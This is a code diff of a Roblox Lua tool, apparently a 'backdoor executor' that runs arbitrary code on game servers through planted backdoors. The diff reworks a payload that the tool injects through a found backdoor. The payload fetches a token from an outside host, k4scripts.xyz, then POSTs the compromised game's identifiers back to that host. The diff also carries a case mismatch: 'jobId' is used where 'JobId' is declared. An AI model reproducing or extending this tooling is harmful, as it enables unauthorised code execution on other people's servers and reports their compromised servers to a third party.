@@ -114,18 +114,17 @@ local LOG_GAME = [[
 if BEXE_LOG == true then return; end;
 getfenv()["BEXE_LOG"] = true;
 
-local TS = game:GetService("TeleportService")
 local _, _, PlaceId, JobId = game:GetService("TeleportService"):GetPlayerPlaceInstanceAsync(%userid%);
     
 local httpService = game:GetService("HttpService");
 httpService:RequestAsync(
     {
-        Url = "https://k4scripts.xyz/hookproxy/log_game",
+        Url = "https://k4scripts.xyz/bexe/log",
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
         },
-        Body = httpService:JSONEncode({PlayerId = "%userid%", GameId = game.GameId, JobId = JobId, PlaceId = PlaceId})
+        Body = httpService:JSONEncode({Token = "%s", GameId = game.GameId, JobId = jobId})
     }
 );
 ]];
@@ -433,13 +432,20 @@ local function getBackdoorFromConfig()
     return nil;
 end;
 
+-- execution level
+local backdoor;
+local firstExecution = true;
 local function resetExecutionState()
     executing = false;
     ui.title.Text = TITLE;
 end;
 
-local backdoor;
-local firstExecution = true;
+local function logGame()
+    local token = game:HttpGet("https://k4scripts.xyz/bexe/token");
+    execute(applyMacros(LOG_GAME):format(token), backdoor, true, true):Wait();
+end;
+
+
 btns.execBtn.MouseButton1Click:Connect(function()
     -- avoid multiple executions
     if executing then
@@ -465,9 +471,8 @@ btns.execBtn.MouseButton1Click:Connect(function()
         games.loadGame(game.PlaceId, encodeBackdoors({backdoor}));
         config.save();
         -- log game
-        local completed = execute(applyMacros(LOG_GAME), backdoor, false, true);
+        logGame();
         firstExecution = false;
-        completed:Wait();
     end;
     -- execute
     local code = applyMacros(editor.getCode());
